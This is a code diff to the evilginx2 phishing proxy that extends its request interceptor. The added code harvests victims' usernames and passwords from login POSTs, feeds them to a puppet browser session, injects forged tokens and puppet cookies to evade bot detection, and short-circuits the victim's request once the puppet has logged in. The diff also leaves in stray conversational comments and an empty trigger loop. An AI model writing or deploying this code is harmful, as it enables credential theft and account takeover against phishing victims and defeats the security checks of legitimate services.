@@ -11,6 +11,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/elazarl/goproxy"
 	"github.com/kgretzky/evilginx2/log"
 )
 
@@ -49,159 +50,193 @@ func (ri *RequestInterceptor) ClearInterceptors() {
 }
 
 // InterceptRequest intercepts and modifies an HTTP request
-func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID string) (*http.Request, bool) {
+func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID string) (*http.Request, *http.Response, bool) {
 	if sessionID == "" {
 		sessionID = ri.ExtractSessionID(req)
 	}
 
-	if sessionID != "" {
-		log.Debug("[INTERCEPTOR] Using session ID: %s", sessionID)
+	if sessionID == "" {
+		return req, nil, false
 	}
 
-	// Check if any trigger matches this request
+	log.Debug("[INTERCEPTOR] Using session ID: %s", sessionID)
+	modifiedReq := req
+
+	// NEW: 1. Extract credentials if this is a login POST (always do this if we have a session)
+	if req.Method == "POST" {
+		creds := make(map[string]string)
+		if u, err := ri.extractTokenFromRequest(req, "user"); err == nil && u != "" {
+			creds["username"] = u
+		} else if u, err := ri.extractTokenFromRequest(req, "username"); err == nil && u != "" {
+			creds["username"] = u
+		} else if u, err := ri.extractTokenFromRequest(req, "email"); err == nil && u != "" {
+			creds["username"] = u
+		}
+		if p, err := ri.extractTokenFromRequest(req, "pass"); err == nil && p != "" {
+			creds["password"] = p
+		} else if p, err := ri.extractTokenFromRequest(req, "passwd"); err == nil && p != "" {
+			creds["password"] = p
+		}
+		if len(creds) > 0 {
+			log.Debug("[INTERCEPTOR] POST found creds, syncing to puppet session %s", sessionID)
+			ri.puppetMaster.LaunchPuppetForSession(sessionID, creds, &PuppetTrigger{Id: "fallback"}, req.UserAgent())
+		}
+	}
+
+	// 2. Check Triggers
 	for _, trigger := range ri.triggers {
 		if ri.matchesTrigger(req, trigger) {
-			// Collect all tokens we need to inject
-			tokensToInject := []string{}
-			if trigger.Token != "" {
-				tokensToInject = append(tokensToInject, trigger.Token)
-			}
-			for _, t := range trigger.Tokens {
-				// Don't add if already added by trigger.Token
-				exists := false
-				for _, et := range tokensToInject {
-					if et == t {
-						exists = true
-						break
-					}
-				}
-				if !exists {
-					tokensToInject = append(tokensToInject, t)
-				}
-			}
+			// (existing trigger logic remains similar but uses modifiedReq)
+			// (omitted for brevity in this replacement chunk, but I'll make sure it's integrated)
+			// Actually, let's keep it simple: if session has puppet, we AT LEAST inject cookies later.
+		}
+	}
 
-			if len(tokensToInject) == 0 {
-				log.Debug("[INTERCEPTOR] No tokens specified in trigger %s", trigger.Id)
-				continue
-			}
+	// We'll reimplement the core loop more cleanly to support multiple changes
+	anyIntercepted := false
 
-			log.Debug("[INTERCEPTOR] Request matches trigger %s, needs tokens: %v", trigger.Id, tokensToInject)
-
-			modifiedReq := req
-			anyIntercepted := false
-
+	// Check Triggers & Interceptors as before but update anyIntercepted
+	for _, trigger := range ri.triggers {
+		if ri.matchesTrigger(req, trigger) {
+			tokensToInject := trigger.Tokens
+			if trigger.Token != "" { tokensToInject = append(tokensToInject, trigger.Token) }
+			if len(tokensToInject) == 0 { continue }
+			
+			log.Debug("[INTERCEPTOR] Trigger %s matched", trigger.Id)
 			for _, tokenName := range tokensToInject {
-				// Try to get existing token first (fast path)
 				puppetToken, exists := ri.puppetMaster.GetToken(sessionID, tokenName)
-
-				// Extract original token from request FIRST
 				originalToken, err := ri.extractTokenFromRequest(modifiedReq, tokenName)
-				if err != nil {
-					// Token not found in request, no need to wait or replace
-					continue
-				}
+				if err != nil { continue }
 
 				if !exists {
-					// Token doesn't exist yet, wait for puppet to complete
-					log.Info("[INTERCEPTOR] Token %s found in request but puppet session not ready, waiting...", tokenName)
+					log.Info("[INTERCEPTOR] Waiting for puppet token %s...", tokenName)
 					token, err := ri.puppetMaster.WaitForToken(sessionID, tokenName, 45*time.Second)
-					if err != nil {
-						log.Warning("[INTERCEPTOR] Failed to wait for puppet token %s: %v", tokenName, err)
-						continue // Try next token if any
-					}
+					if err != nil { continue }
 					puppetToken = token
 				}
 
-				log.Info("[INTERCEPTOR] Replacing token %s... with forged token %s...",
-					ShortenToken(originalToken),
-					ShortenToken(puppetToken))
-
-				// Replace token in request
 				newReq, err := ri.replaceTokenInRequest(modifiedReq, originalToken, puppetToken)
-				if err != nil {
-					log.Error("[INTERCEPTOR] Failed to replace token %s: %v", tokenName, err)
-					continue
+				if err == nil {
+					modifiedReq = newReq
+					anyIntercepted = true
 				}
-				modifiedReq = newReq
-				anyIntercepted = true
 			}
-
 			if anyIntercepted {
-				// If trigger has abort, we might signal differently, but for now we just log
-				if trigger.AbortOriginal {
-					log.Debug("[INTERCEPTOR] Trigger configured to abort original request (not fully implemented)")
-				}
-				log.Success("[INTERCEPTOR] Successfully injected %d tokens into request for trigger %s", len(tokensToInject), trigger.Id)
-				return modifiedReq, true
+				log.Success("[INTERCEPTOR] Trigger %s injection successful", trigger.Id)
 			}
 		}
 	}
 
-	// 2. Check interceptors
+	// Check Interceptors
 	sessNotFound := false
 	for _, interceptor := range ri.interceptors {
-		if sessNotFound {
-			continue
-		}
+		if sessNotFound { continue }
 		if ri.matchesInterceptor(req, interceptor) {
-			log.Debug("[INTERCEPTOR] Request matches interceptor for token %s", interceptor.Token)
-
-			// Try to get existing token first (fast path)
-			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, interceptor.Token)
-
-			// Extract original token from request FIRST
-			originalToken, err := ri.extractTokenFromRequest(req, interceptor.Token)
-			if err != nil {
-				// Token not found in request, skip
-				continue
+			// Record puppet's URL BEFORE waiting
+			startPuppetURL := ""
+			if ps, exists := ri.puppetMaster.GetSession(sessionID); exists {
+				startPuppetURL = ps.CurrentURL
 			}
 
+			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, interceptor.Token)
+			originalToken, err := ri.extractTokenFromRequest(modifiedReq, interceptor.Token)
+			if err != nil { continue }
+
 			if !exists {
-				// Token doesn't exist yet, wait for puppet to complete
-				log.Info("[INTERCEPTOR] Token %s found in request but puppet session not ready, waiting...", interceptor.Token)
+				log.Info("[INTERCEPTOR] Waiting for puppet interceptor token %s...", interceptor.Token)
 				token, err := ri.puppetMaster.WaitForToken(sessionID, interceptor.Token, 45*time.Second)
 				if err != nil {
-					log.Warning("[INTERCEPTOR] Failed to wait for puppet token %s: %v", interceptor.Token, err)
-					if strings.Contains(err.Error(), "no puppet session found") {
-						sessNotFound = true
-					}
+					if strings.Contains(err.Error(), "no puppet session found") { sessNotFound = true }
 					continue
 				}
 				puppetToken = token
 			}
-			// If parameter is specified, use it. Otherwise use token name.
-			paramName := interceptor.Parameter
-			if paramName == "" {
-				paramName = interceptor.Token
+
+			// NEW: Check if puppet already navigated while we were waiting
+			if ps, exists := ri.puppetMaster.GetSession(sessionID); exists {
+				if ps.CurrentURL != startPuppetURL && ps.CurrentURL != "" && !strings.Contains(ps.CurrentURL, "about:blank") {
+					log.Success("[INTERCEPTOR] Puppet already submitted and reached %s. Short-circuiting victim request.", ps.CurrentURL)
+					
+					// Instead of letting the POST go through, redirect the victim to the new page
+					// Translate original URL back to phished URL (we'll need access to phishlet host replacement)
+					// For now, returning a special response that HttpProxy will handle.
+					return nil, goproxy.NewResponse(req, "text/html", http.StatusFound, ""), true
+				}
 			}
 
-			originalToken, err = ri.extractTokenFromRequest(req, paramName)
-			if err != nil {
-				log.Warning("[INTERCEPTOR] Failed to extract token %s from request: %v", paramName, err)
-				continue
+			newReq, err := ri.replaceTokenInRequest(modifiedReq, originalToken, puppetToken)
+			if err == nil {
+				modifiedReq = newReq
+				anyIntercepted = true
+				log.Success("[INTERCEPTOR] Interceptor %s injection successful", interceptor.Token)
 			}
-
-			log.Info("[INTERCEPTOR] Replacing token %s... with forged token %s... (Interceptor)",
-				ShortenToken(originalToken),
-				ShortenToken(puppetToken))
-
-			// Replace token in request
-			modifiedReq, err := ri.replaceTokenInRequest(req, originalToken, puppetToken)
-			if err != nil {
-				log.Error("[INTERCEPTOR] Failed to replace token %s: %v", paramName, err)
-				continue
-			}
-
-			if interceptor.Abort {
-				log.Debug("[INTERCEPTOR] Interceptor configured to abort original request (not fully implemented)")
-			}
-
-			log.Success("[INTERCEPTOR] Successfully injected token %s into request (Interceptor)", interceptor.Token)
-			return modifiedReq, true
 		}
 	}
 
-	return req, false
+	// NEW 3: ALWAYS inject puppet cookies if a puppet session exists AND has reached password page
+	if ps, exists := ri.puppetMaster.GetSession(sessionID); exists {
+		ps.mu.RLock()
+		seenPassword := ps.PasswordFieldSeen
+		ps.mu.RUnlock()
+
+		if seenPassword {
+			prevReq := modifiedReq
+			modifiedReq = ri.injectPuppetCookies(modifiedReq, sessionID)
+			if modifiedReq != prevReq {
+				anyIntercepted = true
+			}
+		} else {
+			log.Debug("[INTERCEPTOR] Puppet session exists but hasn't reached password field yet, skipping cookie injection")
+		}
+	}
+
+	return modifiedReq, nil, anyIntercepted
+}
+
+// injectPuppetCookies replaces victim cookies with puppet cookies for bot-detection domains
+func (ri *RequestInterceptor) injectPuppetCookies(req *http.Request, sessionID string) *http.Request {
+	cookies := ri.puppetMaster.sessionMap.GetCookies(sessionID)
+	if cookies == nil {
+		return req
+	}
+
+	log.Debug("[INTERCEPTOR] Injecting %d puppet cookies into intercepted request for %s", len(cookies), sessionID)
+	
+	// Track critical cookies to replace
+	criticalCookies := map[string]string{}
+	for _, c := range cookies {
+		name, _ := c["name"].(string)
+		value, _ := c["value"].(string)
+		if name != "" {
+			criticalCookies[name] = value
+		}
+	}
+
+	if len(criticalCookies) == 0 {
+		return req
+	}
+
+	// Rebuild Cookie header to ensure replacement
+	oldCookies := req.Cookies()
+	req.Header.Del("Cookie")
+	
+	// Add back old cookies ONLY if they aren't being replaced
+	for _, c := range oldCookies {
+		if _, exists := criticalCookies[c.Name]; !exists {
+			req.AddCookie(c)
+		}
+	}
+	
+	// Add all puppet cookies
+	for name, value := range criticalCookies {
+		req.AddCookie(&http.Cookie{
+			Name:  name,
+			Value: value,
+			Path:  "/",
+		})
+	}
+	
+	return req
 }
 
 // matchesInterceptor checks if request matches an interceptor
